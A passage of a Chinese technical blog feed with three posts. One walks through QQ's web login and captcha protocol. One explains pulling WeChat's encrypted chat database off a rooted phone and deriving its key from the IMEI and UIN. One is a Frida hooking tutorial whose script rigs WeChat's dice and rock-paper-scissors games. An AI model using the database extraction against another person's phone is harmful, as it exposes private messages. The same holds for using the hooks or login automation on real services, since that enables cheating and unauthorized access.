<p>cap_cd的值为<code>yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**</code></p>
<h4 id="第三步：获取sess"><a href="#第三步：获取sess" class="headerlink" title="第三步：获取sess"></a>第三步：获取sess</h4><p>请求：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://captcha.qq.com/cap_union_new_gettype?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;callback=_aq_453849</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>uid是qq号，cap_cd由第二步获取</p>
</blockquote>
<p>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_aq_453849(&#123;&quot;capclass&quot;:&quot;0&quot;,&quot;subcapclass&quot;:&quot;0&quot;,&quot;src&quot;:&quot;cap_union_new_show&quot;,&quot;sess&quot;:&quot;XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&quot;&#125;)</span><br></pre></td></tr></table></figure></p>
<h4 id="第四步：获取visg"><a href="#第四步：获取visg" class="headerlink" title="第四步：获取visg"></a>第四步：获取visg</h4><p>请求：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://captcha.qq.com/cap_union_new_show?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/10/QQ登录简单分析，附易语言登录代码/获取visg.png" alt="获取visg"></p>
<h4 id="第五步：获取图片验证码"><a href="#第五步：获取图片验证码" class="headerlink" title="第五步：获取图片验证码"></a>第五步：获取图片验证码</h4><p>访问地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://captcha.qq.com/cap_union_new_getcapbysig?aid=549000912&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=” ＋ sess ＋ “&amp;noBorder=noborder&amp;showtype=embed&amp;uid=” ＋ uin ＋ “&amp;cap_cd=” ＋ cap_cd ＋ “&amp;lang=2052&amp;rnd=117715&amp;rand=0.5497459754332915&amp;vsig=” ＋ vsig ＋ “&amp;ischartype=1</span><br></pre></td></tr></table></figure></p>
<h4 id="第六步：验证验证码，获取verifycode和pt-verifysession-v1"><a href="#第六步：验证验证码，获取verifycode和pt-verifysession-v1" class="headerlink" title="第六步：验证验证码，获取verifycode和pt_verifysession_v1"></a>第六步：验证验证码，获取verifycode和pt_verifysession_v1</h4><p>post请求：<br><code>http://captcha.qq.com/cap_union_new_verify?random=1488013134675</code></p>
<p>提交内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=QQ号码&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999&amp;subcapclass=0&amp;vsig=g3GflfnCicbaqub3e-SVo2azImuo1gDzQfnGkRnhI-uqLlIXtY6XyXE1dDjUBJHOXCPewnnTo-4mPTtRjScTD9uZaPu4z3x1Jj6inepPQ8l8KCeFeN9laBpiWdqaOF4Eg&amp;cdata=0&amp;collect=OD6q9t0AraWJf%2Bdtq0j8VvuOrjmT8T%2F%2FW8E83RE208unUG0TO1T5psMsZH1p5SXS12WpjU2CcGKHMsp7fciMTLiLY3wUwJBjBxWSqfu%2FbhfCTKUtJdBPeE6P%2FsRfdwemWRYRQwRgdvXZuc42JOqfDIfD%2F2%2B2GeYYxOPohbqY%2BWcW%2Fcut%2BGLcKpJGFTzBtPzKDLU6fTPn6MC%2FNiRGWGehwTy52MK0dIVdd5BYlPQrhFrvrhaisRISHiH%2FhViF7iFpZm5ZclBD5rjqQ4r1O8%2BBDRSB4feMaP2S1Usd0uGrMnVFT8zX7dV7sT2Y1NQ%2Fk5%2FHP%2BgzBQgHMLuH%2FqdSBz%2Fu9wr7oT6Xb0edOUBjPrw55yhZM1R%2FxEJSNwap2f77XRxbJWH%2BFtEuWBC2Gve3MIn9L9loCqk%2Fe0XoGGy%2FuEDvHfEHRCchzaWKH3Hlr5MehOI4WaaPgmbj%2BBeSbcY%2BmDIc1TJ%2BhQmsRf5DoqlqiCuKNQLuX1XS1e3cnfM3%2BonkBImxaqx%2BlTG0HxWAV0Ntsn%2B0%2BeErZleVNI9VIZgIOHDxNkiaG3BucPL1SRuPNtgcNgGFpvYmFqTqPrR%2FgYDPobzlxy%2FcMVEALYB%2FogbH4gy%2FZP7xczjXypgdvtTawokxTUopmKyXVCwvA0coEQzWLW1EQfMsWPNZcA2p58oaelGA3FBlgkZ2iUnx4qukKEZQ7vKFie8VKFBelfNSp6aXcezYbnDbeFHYOAvLeXPriaZ5qBQzNADUtyj%2FhTsY%2BbvmnwCAGT%2F%2BMYeyd9VFWPEbR8cj%2FrRDEEWc0wdd5BOoHzix%2Bz2U<span class="keyword">if</span>9512VwHn9%2Bp3KXAnrK1O%2FQ6HRB7YS9BPyYQvW9ZtpvvKBwOIjf3fx7aqwYqfa7VUzMGv3zkvVA8Bp2JHG2GoQxnVa62ymP3SGshxS4l86ParjFNvepN16O1VaPAidFvqHRXAP14tHMkeC8VTFuqp5cKAY4UdXpPXukOvXPySbdFSPaaAqfIv7%2BckjxFsUPS4cauOx2jif2fQU2maxErLnwrZ10natNklynu5sUn9RSuRDld9v4TNTbyPShDdijM%2BzvpJoMyr4GWiFthB0kZZ2lVnPoqV67VQ%2FPiyCUA9zVbrLSAEOKIz1HQ19I0hdH41fBUPL824xYMdIO1AlZJKGre%2FCvUEgXaHgvbe83QNtFw%2BU946tlGVwR9TCCPltakqyKrT%2F8CtCZ6Mi0qfmFYnF8D7zZBaKxbNgTmMjvwAyz%2F0dMsDi97scJLMYV4w%2Fosk6gvoHEeX6LkbXh5W0aTYTznTSfO2RVfgzWpPiks6rVGzLhfwDyFAyH7%2FOHD7qEWGjnX3fTiBnw5%2FHWqHPJh3Kd%2F4EGe1yE3ZGzxo%2BPETGbcLQaQiiSAaQiFsU5UDoWG1%2FfOjd1Lkjg8D%2FNXuS1BkncxI2Hk%2B4xL0Xa1STqWJGieeyB5DOT9cHYUxEpw1g%3D&amp;ans=ywhm</span><br></pre></td></tr></table></figure></p>
<p>验证码输入正确返回：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"errorCode"</span>:<span class="string">"0"</span> , <span class="string">"randstr"</span> : <span class="string">"@mDo"</span> , <span class="string">"ticket"</span> : <span class="string">"t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*"</span> , <span class="string">"errMessage"</span>:<span class="string">"OK"</span>&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>verifycode为randstr，pt_verifysession_v1为ticket</p>
</blockquote>
<h4 id="第七步：-验证用户名密码是否正确"><a href="#第七步：-验证用户名密码是否正确" class="headerlink" title="第七步： 验证用户名密码是否正确"></a>第七步： 验证用户名密码是否正确</h4><p>请求：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ptlogin2.qq.com/login?u=987654321&amp;verifycode=@mDo&amp;pt_vcode_v1=1&amp;pt_verifysession_v1=t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*&amp;p=A*CEx2PsoaZAYQe7D-5dLmTxdorqI9asO37Wugp2KFHzeEqYpMPh9CHPk7DDzZw5UzD4y1<span class="keyword">in</span>-ZrSoXLx5kJYe1WGZ7sqhg*ZNJ3DtQ65rXR*I5i*dCAQ-h1fFV*u3AdP8IFAAu*borH*xSYbFZDTQ8TjplD2wan2w8MnDfo3h1AyUL*kpt79FqpCfuXnlaSOyTOzkMceEQczxw5DYzmZDetbMeJMYhoqLhQ0WHxbHUafhOEk1EhBDiqXvfETJvCmSMubGN7W*LIF3JPoYFDOgJmmPWqauGvw7C03ehesfIzeNtm-m5R*QX8HyM4dPp*dc3lRUxF2rMuBPn9EVzaqpg__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=5-24-1488013134992&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;pt_uistyle=40&amp;aid=636014201&amp;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>带验证码登录可能存在问题，待修改</p>
</blockquote>
<p><a href="http://fuping.site/2017/04/10/QQ登录简单分析，附易语言登录代码/QQLogin.e">易语言实现代码</a></p>
]]></content>
      
        <categories>
            
            <category> 编程开发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> QQ登录 </tag>
            
            <tag> 易语言 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[微信聊天记录读取]]></title>
      <url>/2017/04/09/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E8%AF%BB%E5%8F%96/</url>
      <content type="html"><![CDATA[<p>根据<a href="http://blog.csdn.net/jiangwei0910410003/article/details/52238891" target="_blank" rel="noopener">四哥</a>教程来自己动手实现一下如何读取微信的聊天记录。以下操作需要在手机Root的情况下进行。<br><a id="more"></a></p>
<h3 id="微信聊天记录保存位置"><a href="#微信聊天记录保存位置" class="headerlink" title="微信聊天记录保存位置"></a>微信聊天记录保存位置</h3><p>微信聊天记录的数据库文件保存在<code>/data/data/com.tencent.mm/MicroMsg/32位字符串/</code>中，名字为<code>EnMicroMsg.db</code>。</p>
<p><img src="/2017/04/09/微信聊天记录读取/微信数据库文件位置.png" alt="微信数据库文件位置"></p>
<h3 id="将聊天记录数据库文件导出"><a href="#将聊天记录数据库文件导出" class="headerlink" title="将聊天记录数据库文件导出"></a>将聊天记录数据库文件导出</h3><p>使用命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/data/com.tencent.mm/MicroMsg/32位字符串/EnMicroMsg.db</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/09/微信聊天记录读取/导出1.png" alt="导出1"><br>直接导出提示不存在，因为是权限的问题。<br>使用adb root没反应，只好将文件copy到一个非root权限可以操作的目录，这里采用了<code>/data/local/tmp</code>文件夹。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp EnMicroMsg.db /data/<span class="built_in">local</span>/tmp/</span><br></pre></td></tr></table></figure></p>
<p>然后导出，执行命令<code>adb pull /data/local/tmp/EnMicroMsg.db</code></p>
<p><img src="/2017/04/09/微信聊天记录读取/权限不足.png" alt="权限不足"></p>
<p>提示权限不足，修改权限后导出。</p>
<p><img src="/2017/04/09/微信聊天记录读取/修改权限导出.png" alt="修改权限导出"></p>
<h3 id="查看SharedPreferences中保存的UIN的值"><a href="#查看SharedPreferences中保存的UIN的值" class="headerlink" title="查看SharedPreferences中保存的UIN的值"></a>查看SharedPreferences中保存的UIN的值</h3><p>切换到<code>/data/data/com.tencent.mm/shared_prefs</code>目录，然后执行<code>grep -rn &quot;uin&quot; *</code>来查看保存的UIN的值</p>
<p><img src="/2017/04/09/微信聊天记录读取/Shared_Pre文件.png" alt="Shared_Pre文件"><br><img src="/2017/04/09/微信聊天记录读取/查看UIN的值.png" alt="查看UIN的值"></p>
<h3 id="读取微信数据库文件内容"><a href="#读取微信数据库文件内容" class="headerlink" title="读取微信数据库文件内容"></a>读取微信数据库文件内容</h3><p>将手机的IMEI和微信用户UIN值进行拼接后进行md5加密，取小写md5的前七位就是微信数据库的密码。<br>用Navicat读取数据库文件是提示错误：<br><img src="/2017/04/09/微信聊天记录读取/Navicat读取数据库文件时提示错误.png" alt="Navicat读取数据库文件时提示错误"><br>这是因为微信数据库用的是SQLCipher开源库提供的加密解密算法，读取数据库文件需要使用SQLCipher这个软件。<br>打开后输入密码，即可看到聊天内容：<br><img src="/2017/04/09/微信聊天记录读取/微信聊天记录.png" alt="微信聊天记录"></p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://blog.csdn.net/jiangwei0910410003/article/details/52238891" target="_blank" rel="noopener">http://blog.csdn.net/jiangwei0910410003/article/details/52238891</a> </p>
]]></content>
      
        <categories>
            
            <category> Android技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 微信聊天记录 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Android HOOK 技术之Frida的初级使用]]></title>
      <url>/2017/04/01/Android-HOOK-%E6%8A%80%E6%9C%AF%E4%B9%8BFrida%E7%9A%84%E5%88%9D%E7%BA%A7%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<p><strong>Frida</strong>是一款基于Python + JavaScript 的Hook与调试框架，在Android\Linux\Windows等平台均能使用。这里我们以<strong>Windows</strong>来对Android应用程序进行Hook。Frida的官网地址是：<a href="https://www.frida.re。" target="_blank" rel="noopener">https://www.frida.re。</a></p>
<a id="more"></a>
<h2 id="Windows下Frida的安装"><a href="#Windows下Frida的安装" class="headerlink" title="Windows下Frida的安装"></a>Windows下Frida的安装</h2><blockquote>
<p>有多种安装方法，这里提供两种，第一种直接使用pip安装，第二种是下载egg文件安装</p>
</blockquote>
<h3 id="1-通过pip安装Frida"><a href="#1-通过pip安装Frida" class="headerlink" title="1.通过pip安装Frida"></a>1.通过pip安装Frida</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br></pre></td></tr></table></figure>
<h3 id="2-去下载对应平台的egg安装包进行安装"><a href="#2-去下载对应平台的egg安装包进行安装" class="headerlink" title="2.去下载对应平台的egg安装包进行安装"></a>2.去下载对应平台的egg安装包进行安装</h3><p>下载地址：<a href="https://pypi.python.org/pypi/frida" target="_blank" rel="noopener">https://pypi.python.org/pypi/frida</a><br>当前最新版本为<strong>9.1.23</strong>，下载对应平台和Python版本的安装包，例如我的系统为Win64，Python为2.7，下载的文件为<strong>frida-9.1.23-py2.7-win-amd64.egg</strong>。下载后安装即可。</p>
<blockquote>
<p>由于网络原因，方法1安装时间太久，这里推荐第二种方法。</p>
</blockquote>
<p>安装完成后在Dos窗口输入命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps</span><br></pre></td></tr></table></figure></p>
<p>出现类似以下的界面表示安装成功。</p>
<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/frida-ps.png" alt="frida-ps"></p>
<h2 id="Android下Frida环境的搭建"><a href="#Android下Frida环境的搭建" class="headerlink" title="Android下Frida环境的搭建"></a>Android下Frida环境的搭建</h2><blockquote>
<p>要求：一部Root过的手机或模拟器，最好采用4.4 ARM系统。PS：我真机采用的是魅族4的5.1系统，有些功能实现不了，只好用模拟器来完成。模拟器的具体配置如下图所示。</p>
</blockquote>
<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/模拟器配置.png" alt="模拟器配置"></p>
<p>首先需用下载最新的frida-server，下载地址为：<a href="http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。" target="_blank" rel="noopener">http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。</a><br>下载后将文件上传到手机中，并赋予执行权限。上传到手机使用如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server /data/local/tmp/</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/adb push.png" alt="adb push"></p>
<p>将frida-server赋予执行权限，命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp/</span><br><span class="line">chmod 777 frida-server</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/运行Frida-Server.png" alt="运行Frida-Server"></p>
<p>运行Frida-Server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./data/local/tmp/frida-server</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/运行Frida-Server结果.png" alt="运行Frida-Server结果"></p>
<p>执行frida-ps -U可以看到手机上的进程</p>
<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/手机进程.png" alt="手机进程"></p>
<blockquote>
<p>使用frida-ps -R 也可以，但是需要进行转发。执行<code>adb forward tcp:27042 tcp:27042</code>后执行<code>frida-ps -R</code>也可以看到手机上的进程</p>
</blockquote>
<p>至此，准备工作已经做好，现在来进行对Android上的程序进行Hook了。<br>首先以WX的掷骰子和猜拳头为例。这里采用最新版的WX（<strong>6.5.7</strong>）。<br>其代码如下所示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">var be= Java.use("com.tencent.mm.sdk.platformtools.bf");</span></span><br><span class="line"><span class="string">send("start")</span></span><br><span class="line"><span class="string">be.da.implementation = function()&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    var type = arguments[0];</span></span><br><span class="line"><span class="string">    send(type);//5表示掷骰子，2表示猜拳头</span></span><br><span class="line"><span class="string">    if(type ==2)&#123;</span></span><br><span class="line"><span class="string">    return 1;//表示是石头</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        return 5;//骰子6点</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">send("end")</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'com.tencent.mm'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">print(<span class="string">'[*] weixin Start...'</span>)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></p>
<p>手机上打开微信后，运行代码。<br>然后点击掷骰子，可以看到都是6点，猜拳头全部是石头。<br><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/运行结果.png" alt="运行结果"></p>
<p>下面来用一个例子来介绍一下，如何来通过Hook的方法修改原来的内容，以及当出现相同方法名时，如何对该方法进行Hook。<br>其Android的Activity代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.fridatest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> Button myButton1;</span><br><span class="line">		<span class="keyword">private</span> String TAG = <span class="string">"fuping"</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="meta">@Override</span></span><br><span class="line">	    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">	        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">	        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">	        myButton1 = (Button) findViewById(R.id.button1);</span><br><span class="line">	        myButton1.setOnClickListener( <span class="keyword">new</span> ButtonClick());</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="class"><span class="keyword">class</span> <span class="title">ButtonClick</span> <span class="keyword">implements</span> <span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">	        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">	            <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">	            <span class="keyword">case</span> R.id.button1:</span><br><span class="line">	                <span class="keyword">int</span> nRet = test(<span class="number">4</span>);</span><br><span class="line">	                String strRet = nRet + <span class="string">""</span>;</span><br><span class="line">	                Toast.makeText(MainActivity.<span class="keyword">this</span>, strRet,Toast.LENGTH_LONG).show();</span><br><span class="line">	                Log.i(TAG, <span class="string">"test(int):"</span>+ strRet);</span><br><span class="line">	                strRet = test(<span class="number">4</span>,<span class="number">2</span>)+<span class="string">""</span>;</span><br><span class="line">	                Log.i(TAG, <span class="string">"test(int,int):"</span>+ strRet);</span><br><span class="line">	                strRet = test(<span class="number">4</span>,<span class="string">"2"</span>)+<span class="string">""</span>;</span><br><span class="line">	                Log.i(TAG, <span class="string">"test(int,String):"</span>+ strRet);</span><br><span class="line">	                strRet = change(<span class="number">4</span>,<span class="string">"2"</span>)+<span class="string">""</span>;</span><br><span class="line">	                Log.i(TAG, <span class="string">"change(int,String):"</span>+ strRet);</span><br><span class="line">	                <span class="keyword">break</span>;</span><br><span class="line">	            <span class="keyword">default</span>:</span><br><span class="line">	                <span class="keyword">break</span>;</span><br><span class="line">	            &#125;</span><br><span class="line">	        &#125;</span><br><span class="line"></span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	        <span class="keyword">int</span> nRet = num*<span class="number">2</span>;</span><br><span class="line">	        <span class="keyword">return</span> nRet;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	        <span class="keyword">int</span> nRet = num*<span class="number">2</span> + b ;</span><br><span class="line">	        <span class="keyword">return</span> nRet;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(<span class="keyword">int</span> num,String b)</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	    	String nRet = num*<span class="number">2</span> + b ;</span><br><span class="line">	        <span class="keyword">return</span> nRet;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="function"><span class="keyword">public</span> String <span class="title">change</span><span class="params">(<span class="keyword">int</span> num,String b)</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	    	String nRet = num*<span class="number">2</span> + b ;</span><br><span class="line">	        <span class="keyword">return</span> nRet;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先演示一下对change方法的hook。<br>hook之前change方法输出的结果为82，预期Hook之后输出的结果应该为164。<br>在真机上运行结果如下所示：</p>
<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/对change进行hook.png" alt="对change进行hook"></p>
<p>发现Hook之后返回的是null，而且报错。（经过多次给手机系统升级或降级，都无法成功，最后之后在模拟器上测试了）</p>
<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/模拟器上对change方法进行hook.png" alt="模拟器上对change方法进行hook"></p>
<p>在模拟器上进行Hook后，出现了预期的结果。<br>在对test方法进行hook时，由于有多个test方法，所以在进行Hook时，需要指定是哪个方法。<br>例如对<code>String test(int num,String b)</code>进行hook时，可以使用如下代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> TM = Java.use(<span class="string">"com.test.fridatest.MainActivity"</span>);</span><br><span class="line">TM.test.overload(<span class="string">"int"</span>,<span class="string">"java.lang.String"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">    send(<span class="string">"Called - test(int,String):"</span>+a+<span class="string">"----"</span>+b);</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">this</span>.test.overload(<span class="string">"int"</span>,<span class="string">"java.lang.String"</span>).call(<span class="keyword">this</span>,<span class="number">8</span>,<span class="string">"3"</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>附上对test和change同时hook 的结果：</p>
<p><img src="/2017/04/01/Android-HOOK-技术之Frida的初级使用/对test和change的hook.png" alt="对test和change的hook"></p>
